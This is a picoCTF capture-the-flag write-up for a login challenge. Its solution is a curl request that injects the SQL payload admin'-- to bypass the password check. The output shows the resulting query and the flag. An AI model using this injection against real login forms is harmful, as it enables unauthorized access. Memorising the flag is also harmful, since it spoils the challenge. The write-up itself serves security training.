
There is a website running at `https://jupiter.challenges.picoctf.org/problem/33850/` ([link](https://jupiter.challenges.picoctf.org/problem/33850/)) or http://jupiter.challenges.picoctf.org:33850. Do you think you can log us in? Try to see if you can login!


Hints:
There doesn't seem to be many ways to interact with this. I wonder if the users are kept in a database?

Try to think about how the website verifies your login.



**Solución 1**

```

(kali㉿kali)-[~]
└─$ curl https://jupiter.challenges.picoctf.org/problem/33850/login.php -d "username=admin'--&password=hlla&debug=1"
<pre>username: admin'--
password: hlla
SQL query: SELECT * FROM users WHERE name='admin'--' AND password='hlla'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{s0m3_SQL_f8adf3fb}</p>


```


## Respuesta: **picoCTF{s0m3_SQL_f8adf3fb}**



